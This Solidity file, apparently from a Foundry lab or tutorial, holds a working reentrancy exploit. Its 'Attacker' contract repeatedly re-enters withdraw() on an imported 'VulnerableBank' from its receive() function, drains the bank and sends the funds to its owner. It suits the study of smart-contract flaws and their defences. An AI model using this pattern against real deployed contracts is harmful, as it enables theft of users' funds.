// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./VulnerableBank.sol";
import "forge-std/console.sol";

/**
 * @title Attacker
 * @dev This contract exploits the reentrancy vulnerability in VulnerableBank
 */
contract Attacker {
    VulnerableBank public vulnerableBank;
    address public owner;

    // Track whether we're in the middle of an attack
    bool private attacking;

    event AttackStarted(uint256 initialDeposit);
    event AttackCompleted(uint256 stolenAmount);

    constructor(address vulnerableBankAddress) {
        vulnerableBank = VulnerableBank(vulnerableBankAddress);
        owner = msg.sender;
    }

    // Function to start the attack
    function attack() external payable {
        require(msg.sender == owner, "Only owner can attack");
        require(msg.value > 0, "Need ETH to attack");

        // Initial deposit to get a balance in the vulnerable contract
        emit AttackStarted(msg.value);
        console.log("Attacker: Starting attack with initial deposit of %s wei", msg.value);

        // Make an initial deposit
        vulnerableBank.deposit{value: msg.value}();

        // Start the attack
        attacking = true;
        vulnerableBank.withdraw();
        attacking = false;

        // Report stolen funds
        uint256 stolenAmount = address(this).balance;
        emit AttackCompleted(stolenAmount);
        console.log("Attacker: Attack completed. Stolen amount: %s wei", stolenAmount);

        // Send stolen funds to the owner
        (bool success,) = owner.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }

    // This function gets called when the vulnerable contract sends ETH
    receive() external payable {
        if (attacking && address(vulnerableBank).balance > 0) {
            console.log(
                "Attacker: Reentering withdraw() while in receive(). Bank balance: %s wei",
                address(vulnerableBank).balance
            );
            vulnerableBank.withdraw();
        }
    }
}
